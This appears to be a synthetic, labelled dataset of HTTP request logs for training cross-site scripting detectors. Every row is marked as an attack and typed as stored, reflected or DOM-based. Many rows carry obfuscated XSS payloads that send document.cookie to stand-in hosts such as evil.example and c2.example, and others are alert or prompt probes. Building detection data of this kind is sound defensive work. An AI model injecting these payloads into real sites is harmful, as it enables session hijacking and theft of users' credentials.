time,source_ip,host,method,uri,user_agent,request_body,referer,flow_uid,dup_index,session_id,session_seq,label,attack_family,obfuscated,synthetic_duplicate,forced_unique_nonce,TEMP_benign_augmentation,aug_category
2023-09-08T14:50:09Z,213.27.199.190,37.85.58.9:443,GET,/redirect?ref=%3Cscript%3Efetch('http://evil.example/c?c='+document.cookie)%3C/script%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,https://duckduckgo.com/,CigiNN3yShWKrEBvPd,0,f4b48ec90983,6,1,stored,True,False,False,,
2023-09-08T14:50:10Z,213.27.199.190,37.85.58.9:443,GET,/filter?id=%3Cscript%3Efetch('http://attacker.example/grab?token='+document.cookie)%3C/script%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",,,CkZQRr1TYSRFKxvFT2,0,f4b48ec90983,7,1,stored,True,False,False,,
2023-09-08T15:08:51Z,37.68.189.70,37.85.58.9:443,POST,/reviews,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=#<svg ONlOAD=PRomPt('xSS')>&name=guest,,C9TEKhSsqi2Jwv8ua,0,fe699e781bc5,1,1,dom_based,True,False,False,,
2023-09-08T15:08:51Z,37.68.189.70,37.85.58.9:443,POST,/contact,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=<SVG srC=1 OnloaD=aLERt(nAVIGATOr.USeRAgEnT)>&name=guest,https://www.google.com/,CpTKer41ZtJjotyZ2a,0,fe699e781bc5,2,1,stored,True,False,False,,
2023-09-08T15:08:51Z,37.68.189.70,37.85.58.9:443,GET,/product?q=#<scRiPt>ALeRt('pWN')</sCrIPT>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",,https://duckduckgo.com/,C8PYMI1OEQyP93vuHd,0,fe699e781bc5,3,1,dom_based,True,False,False,,
2023-09-08T15:08:51Z,37.68.189.70,37.85.58.9:443,POST,/support/ticket,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=#<svG ONLOAd=aLErt(docUMEnT.DoMaIn)>&name=guest,-,CPteEP21pnbzLuHVwd,0,fe699e781bc5,4,1,dom_based,True,False,False,,
2023-09-08T15:08:51Z,37.68.189.70,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=%3CsCRipt%3EDOCumENt.LoCAtIOn='htTp://c2.exAmPLe/Log?d='+docUMenT.cOOKIe%3C/sCRIpt%3E&name=guest,https://www.bing.com/,CLyhvz2i1slIVa1Ejg,0,fe699e781bc5,5,1,stored,True,False,False,,
2023-09-08T15:08:51Z,37.68.189.70,37.85.58.9:443,POST,/feedback,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=%3Cscr%3Cscript%3Eipt%3Efetch('http://exfil.example/grab?d='+document.cookie)%3C/script%3E&name=guest,,CEPkbp4Aznz1KoCnBl,0,fe699e781bc5,6,1,stored,True,False,False,,
2023-09-08T15:08:52Z,37.68.189.70,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",comment=#<ScripT>aLerT(locALStOraGe.lENGTh)</script>&name=guest,,CkPHEU379eHecu1Csc,0,fe699e781bc5,7,1,dom_based,True,False,False,,
2023-09-08T16:02:55Z,72.176.136.16,37.85.58.9:443,GET,/redirect?id=<scRIPt>consOLe.lOG(Document.cOokIe)</sCRipt>,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,https://www.bing.com/,COWP9i31AIGbLTYD81,0,d1bed74b0b85,1,1,reflected,True,False,False,,
2023-09-08T16:02:55Z,72.176.136.16,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",comment=#<scRIPT>aleRT(2)</sCript>&name=guest,-,COCfiW3VKNpzInpWvi,0,d1bed74b0b85,2,1,dom_based,True,False,False,,
2023-09-08T16:02:55Z,72.176.136.16,37.85.58.9:443,GET,/browse?query=jAvaScrIPT:alErT(1),"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,,CVcbv82jTMS30DAdLi,0,d1bed74b0b85,3,1,dom_based,True,False,False,,
2023-09-08T16:02:55Z,72.176.136.16,37.85.58.9:443,GET,/product?ref=<SELEcT autOFOcUs ONfOCuS=ALErt(NaviGATOR.uSeRaGEnT)>,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,https://www.google.com/,CA5sYb37901sJuQKwg,0,d1bed74b0b85,4,1,reflected,True,False,False,,
2023-09-08T16:02:55Z,72.176.136.16,37.85.58.9:443,POST,/support/ticket,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",comment=#<IMg src=x OnERRoR=CONSOle.LOG(doCUMeNT.coOkIe)>&name=guest,,CVTgWIK4FYObwgqm,0,d1bed74b0b85,5,1,dom_based,True,False,False,,
2023-09-08T16:02:55Z,72.176.136.16,37.85.58.9:443,GET,/catalog?search=%3CScRIpT%3EconsOLe.LoG(doCUMENt.CoOkIE)%3C/ScRIpt%3E,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,-,CdcqfQ3sGXHiHTM73j,0,d1bed74b0b85,6,1,reflected,True,False,False,,
2023-09-08T16:02:55Z,72.176.136.16,37.85.58.9:443,POST,/reviews,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",comment=JaVascriPT:ALErT(1)&name=guest,https://www.google.com/,CNzEfe4GritB2rlLNh,0,d1bed74b0b85,7,1,dom_based,True,False,False,,
2023-09-08T16:20:22Z,154.17.117.131,37.85.58.9:443,POST,/support/ticket,python-requests/2.31.0,comment=%3CSCRIPt%3ENEw IMAgE().src='HttP://eXFil.EXamPlE/C?Data='+doCUmENt.COoKie%3C/scrIPt%3E&name=guest,,CSOOF8MrGluhbEZg8,0,b1b627ac0382,1,1,stored,True,False,False,,
2023-09-08T16:20:22Z,154.17.117.131,37.85.58.9:443,POST,/api/messages,python-requests/2.31.0,"comment=<a HReF=""JaVasCrIpT:ALeRT(LocalSTORAGE.LEngTH)"">LinK</A>&name=guest",,CXwdng360grLobzxfi,0,b1b627ac0382,2,1,reflected,True,False,False,,
2023-09-08T16:20:22Z,154.17.117.131,37.85.58.9:443,POST,/reviews,python-requests/2.31.0,comment=<sVG><SCRIPT>ALert(LOcalsToragE.LEngtH)</ScRipT></Svg>&name=guest,,CqCMdv4foqt5Y5NAVh,0,b1b627ac0382,3,1,reflected,True,False,False,,
2023-09-08T16:20:22Z,154.17.117.131,37.85.58.9:443,POST,/reviews,python-requests/2.31.0,comment=#<sVG oNLoAD=alErT(DoCumENt.cOokIe)>&name=guest,https://duckduckgo.com/,CG5fFT1CBcO0bMdDCh,0,b1b627ac0382,4,1,dom_based,True,False,False,,
2023-09-08T16:20:22Z,154.17.117.131,37.85.58.9:443,POST,/api/messages,python-requests/2.31.0,comment=#<SvG onload=CoNSOLE.log(docUMENT.cooKie)>&name=guest,https://www.bing.com/,CCCrej3XvY8sKkuLla,0,b1b627ac0382,5,1,dom_based,True,False,False,,
2023-09-08T16:20:22Z,154.17.117.131,37.85.58.9:443,POST,/feedback,python-requests/2.31.0,comment=%3CsvG%3E%3CScRIPt%3EcOnFirm('XSS')%3C/sCRipT%3E%3C/svg%3E&name=guest,,CnWmw7bmnbOC9L4Ve,0,b1b627ac0382,6,1,reflected,True,False,False,,
2023-09-08T16:20:22Z,154.17.117.131,37.85.58.9:443,POST,/feedback,python-requests/2.31.0,comment=<aUDiO src=X OnERRor=aLErT(LOcALstOraGE.lENgtH)>&name=guest,https://www.google.com/,CWeyVyy24mltAa6Qj,0,b1b627ac0382,7,1,stored,True,False,False,,
2023-09-08T16:21:11Z,154.17.117.131,37.85.58.9:443,POST,/support/ticket,python-requests/2.31.0,comment=<scRIpt>DoCumeNT.LOCAtIon='HtTP://eVIL.ExAmplE/cOlLeCt?Ck='+dOCUMENT.COOKIe</scRiPT>&name=guest,https://duckduckgo.com/,Cap4BA1XRYw8mFNM3k,0,b1b627ac0382,8,1,stored,True,False,False,,
2023-09-08T16:21:11Z,154.17.117.131,37.85.58.9:443,GET,/product?redirect=<svg><scripT>ProMPt(1)</scRiPt></sVG>,python-requests/2.31.0,,https://www.google.com/,C9ODrUIY382hx7n24,0,b1b627ac0382,9,1,reflected,True,False,False,,
2023-09-08T16:21:11Z,154.17.117.131,37.85.58.9:443,GET,/api/items?q=<ScRIpt>FETcH('HtTp://coLlecTor.ExAmpLE/c?dATa='+DOcumeNT.CoOkie)</ScRIpT>,python-requests/2.31.0,,,Co3Ytr1dHqwLcZ8KGa,0,b1b627ac0382,10,1,stored,True,False,False,,
2023-09-08T16:21:11Z,154.17.117.131,37.85.58.9:443,POST,/reviews,python-requests/2.31.0,comment=<SCRIPT>AlErt(1337)</Script>&name=guest,,CSaUya16DvebwQAzn,0,b1b627ac0382,11,1,reflected,True,False,False,,
2023-09-08T16:21:12Z,154.17.117.131,37.85.58.9:443,POST,/contact,python-requests/2.31.0,comment=#<sCrIPT>aLERT(localStoRaGE.LenGTh)</ScRIpt>&name=guest,-,CpgGMP16zJ5id9qECl,0,b1b627ac0382,12,1,dom_based,True,False,False,,
2023-09-08T16:21:12Z,154.17.117.131,37.85.58.9:443,GET,/filter?ref=<MaRquEE OnStArt=AleRt(DOCUmENt.coOKiE)>,python-requests/2.31.0,,https://www.google.com/,CTmtVx3rJGqBa8gJtd,0,b1b627ac0382,13,1,stored,True,False,False,,
2023-09-08T16:21:12Z,154.17.117.131,37.85.58.9:443,POST,/comment,python-requests/2.31.0,comment=%3Cscript%3Efetch('http://exfil.example/sink?d='+document.cookie)%3C/script%3E&name=guest,,CDNdsI1segiIuo1dk,0,b1b627ac0382,14,1,stored,True,False,False,,
2023-09-08T16:30:16Z,175.113.218.101,37.85.58.9:443,POST,/feedback,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<ScRipT>dOcUmEnT.lOcAtioN='HtTP://aTTACkeR.ExaMpLE/BEACon?Data='+DOcument.CoOkie</ScRiPT>&name=guest,https://duckduckgo.com/,CaUpBe2aPtimXwRmoa,0,4bd3aebd8fac,1,1,stored,True,False,False,,
2023-09-08T16:30:16Z,175.113.218.101,37.85.58.9:443,GET,/redirect?name=#%3CiMg SRc=X OnErrOr=proMPt('xsS')%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.google.com/,C25h8m4pVBirD0Wr6h,0,4bd3aebd8fac,2,1,dom_based,True,False,False,,
2023-09-08T16:30:16Z,175.113.218.101,37.85.58.9:443,GET,"/search?search=%3CA HreF=""JAVasCRipT:ALerT(locALSToragE.leNgTH)""%3ELINK%3C/a%3E","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.google.com/,CjR2b33n4AChQnqKWd,0,4bd3aebd8fac,3,1,reflected,True,False,False,,
2023-09-08T16:30:16Z,175.113.218.101,37.85.58.9:443,POST,/feedback,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=JavAscriPt:ALErt('Xss')&name=guest,https://duckduckgo.com/,CR33pq2aR1OxXVUgSk,0,4bd3aebd8fac,4,1,dom_based,True,False,False,,
2023-09-08T16:30:17Z,175.113.218.101,37.85.58.9:443,GET,/lookup?ref=#<SvG ONLoAD=alErT('PWn')>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.google.com/,Cjo0H73wvHo3JbM7Ji,0,4bd3aebd8fac,5,1,dom_based,True,False,False,,
2023-09-08T16:30:17Z,175.113.218.101,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<scr<script>ipt>new Image().src='http://evil.example/log?d='+document.cookie</script>&name=guest,https://duckduckgo.com/,CcY1l427VSDJYXHsk9,0,4bd3aebd8fac,6,1,stored,True,False,False,,
2023-09-08T16:30:17Z,175.113.218.101,37.85.58.9:443,POST,/api/messages,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<SvG><sCrIPt>aLErT(1)</sCrIpt></SVg>&name=guest,-,CKb7qJ3NZRQQfag4F1,0,4bd3aebd8fac,7,1,reflected,True,False,False,,
2023-09-08T16:30:35Z,175.113.218.101,37.85.58.9:443,GET,/search?term=#<imG SRC=X ONERrOr=alerT(1)>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://duckduckgo.com/,C8iTsE2lDGMorfHfP7,0,4bd3aebd8fac,8,1,dom_based,True,False,False,,
2023-09-08T16:30:35Z,175.113.218.101,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=javaSCRiPt:ALErt(windOW.locAtion)&name=guest,https://www.google.com/,ClyFrR3dbkk2vLJ9r,0,4bd3aebd8fac,9,1,dom_based,True,False,False,,
2023-09-08T16:30:35Z,175.113.218.101,37.85.58.9:443,POST,/api/messages,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<sCRipt>ALErt(2)</SCriPT>&name=guest,-,CFt2Elz1xdY0jksZi,0,4bd3aebd8fac,10,1,reflected,True,False,False,,
2023-09-08T16:30:35Z,175.113.218.101,37.85.58.9:443,GET,/api/items?redirect=#%3CIMG src=X OnErRoR=aleRT(WINDoW.locATION)%3E,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.google.com/,CivjpG2MpVtG7cZ3pd,0,4bd3aebd8fac,11,1,dom_based,True,False,False,,
2023-09-08T16:30:35Z,175.113.218.101,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=#<iMg sRC=X onERROr=alerT('xSs')>&name=guest,https://duckduckgo.com/,CaSY7C3NTC9iVm3wV,0,4bd3aebd8fac,12,1,dom_based,True,False,False,,
2023-09-08T16:30:35Z,175.113.218.101,37.85.58.9:443,GET,"/browse?ref=%3Ca hREF=""jaVAsCrIPt:pROMPT(1)""%3ElINK%3C/A%3E","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,,CKO03A10FWzuWXMAKg,0,4bd3aebd8fac,13,1,reflected,True,False,False,,
2023-09-08T16:30:35Z,175.113.218.101,37.85.58.9:443,POST,/feedback,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=#<iMg SRC=x ONErRoR=AlErT(LOcAlstoRAGE.LenGth)>&name=guest,,CgL2bk1DuuV60gumDh,0,4bd3aebd8fac,14,1,dom_based,True,False,False,,
2023-09-08T16:31:08Z,175.113.218.101,37.85.58.9:443,POST,/api/messages,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=%3CscrIpt%3EFetcH('httP://c2.exAMpLe/gRAb?toKeN='+DocUmeNT.CooKiE)%3C/scriPt%3E&name=guest,,CVljo52ZfrdZrgH3xa,0,4bd3aebd8fac,15,1,stored,True,False,False,,
2023-09-08T16:31:08Z,175.113.218.101,37.85.58.9:443,GET,/catalog?redirect=JavAsCrIpt:proMPT(1),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.bing.com/,CacHLs31k3AVTyG3C4,0,4bd3aebd8fac,16,1,dom_based,True,False,False,,
2023-09-08T16:31:08Z,175.113.218.101,37.85.58.9:443,GET,/catalog?term=<scrIpT>DOCumEnt.LOcation='HTtp://c2.eXAmPLE/SINk?D='+dOcUmENT.COoKIe</scrIpT>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://www.google.com/,CoO49c1ywQluKye7Z7,0,4bd3aebd8fac,17,1,stored,True,False,False,,
2023-09-08T16:31:08Z,175.113.218.101,37.85.58.9:443,GET,/api/items?redirect=<scriPT>New IMaGE().SRc='HtTP://lISTENer.Example/sINk?d='+doCUMeNT.coOKie</ScriPt>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,https://duckduckgo.com/,C0iaV14y1BlPEJcLtc,0,4bd3aebd8fac,18,1,stored,True,False,False,,
2023-09-08T16:31:09Z,175.113.218.101,37.85.58.9:443,POST,/comment,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<sCRIPt>FeTCh('htTp://c2.eXAMPlE/GRaB?c='+DocUment.CookIE)</sCRiPt>&name=guest,-,CalgUZ1V4SqY3bNzha,0,4bd3aebd8fac,19,1,stored,True,False,False,,
2023-09-08T16:31:09Z,175.113.218.101,37.85.58.9:443,POST,/reviews,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",comment=<bODY ONLoAd=pRompt('xss')>&name=guest,,CappF6MHaNYZqaKBg,0,4bd3aebd8fac,20,1,reflected,True,False,False,,
2023-09-08T16:31:09Z,175.113.218.101,37.85.58.9:443,GET,/product?ref=<SCRipt>DocuMeNt.LOcaTiOn='HtTp://EXFiL.ExaMPle/ColleCt?C='+DoCuMeNt.coOKie</SCRipT>,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",,,CzYSuM3BDGbqpnPgS3,0,4bd3aebd8fac,21,1,stored,True,False,False,,
2023-09-08T16:54:24Z,130.175.6.104,37.85.58.9:443,GET,/product?name=%3Cscript%3Enew Image().src='http://collector.example/sink?d='+document.cookie%3C/script%3E,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,https://www.google.com/,C7bS3E3NUJ7I9hVEW8,0,984dd29d8af8,1,1,stored,True,False,False,,
2023-09-08T16:54:24Z,130.175.6.104,37.85.58.9:443,GET,/catalog?query=<SElECT AUtoFOCus ONFoCUS=alerT(docUmenT.cOOkIe)>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,,CFLK7P0g4ibVOEgm5,0,984dd29d8af8,2,1,reflected,True,False,False,,
2023-09-08T16:54:24Z,130.175.6.104,37.85.58.9:443,GET,"/search?id=%3Ca HREf=""JaVaSCrIpT:pROMpt(1)""%3EvieW%3C/A%3E","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,,C8afFw44goORlzX4e7,0,984dd29d8af8,3,1,reflected,True,False,False,,
2023-09-08T16:54:24Z,130.175.6.104,37.85.58.9:443,GET,/redirect?id=<scr<script>ipt>document.location='http://exfil.example/collect?token='+document.cookie</script>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,https://www.google.com/,C8XVqj2vccvKVfLCc,0,984dd29d8af8,4,1,stored,True,False,False,,
2023-09-08T16:54:24Z,130.175.6.104,37.85.58.9:443,GET,/catalog?search=<InPUT aUTofoCus onFocuS=cOnSOle.loG(dOcUMENt.cookIE)>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,https://www.google.com/,CkalzO2V7jut9wIhTj,0,984dd29d8af8,5,1,reflected,True,False,False,,
2023-09-08T16:54:24Z,130.175.6.104,37.85.58.9:443,POST,/api/messages,"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",comment=<SCriPT>DoCUMENt.LoCAtiOn='HtTP://evIl.example/c?ck='+doCuMeNt.cOOKIE</ScriPT>&name=guest,-,CmrHb84nGYCXTTqbl4,0,984dd29d8af8,6,1,stored,True,False,False,,
2023-09-08T16:54:25Z,130.175.6.104,37.85.58.9:443,GET,"/api/items?id=%3Ca hRef=""JaVaSCRIpt:alErT(1337)""%3EliNK%3C/A%3E","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",,,COAk641zUpVKRlM2nl,0,984dd29d8af8,7,1,reflected,True,False,False,,
2023-09-08T16:57:23Z,138.251.101.99,37.85.58.9:443,GET,/api/items?redirect=<svG><sCripT>alert('xsS')</ScriPT></SVG>,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,,https://www.bing.com/,CI2EtYIMghdhTwBuk,0,fcc4fefb2b32,1,1,reflected,True,False,False,,
2023-09-08T16:57:23Z,138.251.101.99,37.85.58.9:443,POST,/comment,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,comment=<SCRipT>FEtCh('hTTp://ATtacker.eXaMPLe/C?DATA='+documEnt.coOkie)</ScrIpT>&name=guest,,CWdLOUMdsYIUWCmY4,0,fcc4fefb2b32,2,1,stored,True,False,False,,
2023-09-08T16:57:23Z,138.251.101.99,37.85.58.9:443,POST,/reviews,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,comment=<scr<script>ipt>fetch('http://collector.example/sink?d='+document.cookie)</script>&name=guest,,CEbC1923Yhp0j15zH5,0,fcc4fefb2b32,3,1,stored,True,False,False,,
2023-09-08T16:57:23Z,138.251.101.99,37.85.58.9:443,GET,/redirect?redirect=<ScRiPT>NEw image().SRC='HTtp://C2.exaMPlE/c?dATa='+DocUMEnT.COoKIe</SCRIPT>,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,,https://www.google.com/,C8s8Ty1O0mX2n4Xha,0,fcc4fefb2b32,4,1,stored,True,False,False,,
2023-09-08T16:57:23Z,138.251.101.99,37.85.58.9:443,GET,/search?query=%3CSCRipT%3EfetcH('hTtP://coLLECToR.EXAMPle/bEACOn?d='+DOCuMEnT.CookiE)%3C/sCriPT%3E,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,,https://duckduckgo.com/,CD72dY1LKyQf3xNF8g,0,fcc4fefb2b32,5,1,stored,True,False,False,,
2023-09-08T16:57:23Z,138.251.101.99,37.85.58.9:443,GET,/api/items?redirect=<sVG><sCrIPT>promPT(1)</sCRipt></SVg>,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,,https://duckduckgo.com/,CuE5Rn1NSmjeZ9Wlbh,0,fcc4fefb2b32,6,1,reflected,True,False,False,,
2023-09-08T16:57:24Z,138.251.101.99,37.85.58.9:443,POST,/support/ticket,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0,comment=%3CsCrIPt%3EdOcUMeNt.loCATiOn='HtTP://eVil.ExAmpLE/Log?cK='+DOcUmENt.coOKie%3C/scRiPT%3E&name=guest,https://duckduckgo.com/,CY7IiN3ry5q4uCnX9h,0,fcc4fefb2b32,7,1,stored,True,False,False,,
2023-09-08T16:58:28Z,157.194.204.170,37.85.58.9:443,GET,/redirect?ref=<AUDio src=X ONErROR=ALeRt(1)>,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,https://duckduckgo.com/,CChxaU2OSLhniuQXr4,0,7e0237cef341,1,1,reflected,True,False,False,,
2023-09-08T16:58:28Z,157.194.204.170,37.85.58.9:443,GET,/api/items?redirect=JavaScrIpt:aLErT(1),"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,https://www.google.com/,CbW6ky38ztla9BB1ek,0,7e0237cef341,2,1,dom_based,True,False,False,,
2023-09-08T16:58:28Z,157.194.204.170,37.85.58.9:443,POST,/reviews,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",comment=%3CMARQUEE OnStART=aLert('pWn')%3E&name=guest,-,CCfGTk19cpQvfaZC7l,0,7e0237cef341,3,1,reflected,True,False,False,,
2023-09-08T16:58:28Z,157.194.204.170,37.85.58.9:443,GET,/browse?search=%3Cscript%3Efetch('http://exfil.example/log?d='+document.cookie)%3C/script%3E,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",,-,CHNqatSVQWdpOeNB,0,7e0237cef341,4,1,stored,True,False,False,,
